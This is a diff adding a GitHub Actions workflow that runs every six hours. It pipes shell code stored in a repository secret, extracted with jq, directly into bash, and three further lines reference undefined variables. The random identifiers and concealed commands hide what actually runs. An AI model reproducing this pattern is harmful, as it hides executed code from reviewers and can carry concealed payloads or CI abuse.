@@ -1,0 +1,20 @@
+name: guanjianyuu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guanjianyuu
+        env:
+          iclmj8251: ${{ secrets.iclmj8251 }}
+        run: |
+          echo $iclmj8251 | jq -r .vm3757 | /bin/bash
+          echo $bjw954 | jq -r .sws5 | /bin/bash
+          echo $tfxf34753 | jq -r .cafuq65 | /bin/bash
+          echo $co6 | jq -r .p30208 | /bin/bash
+
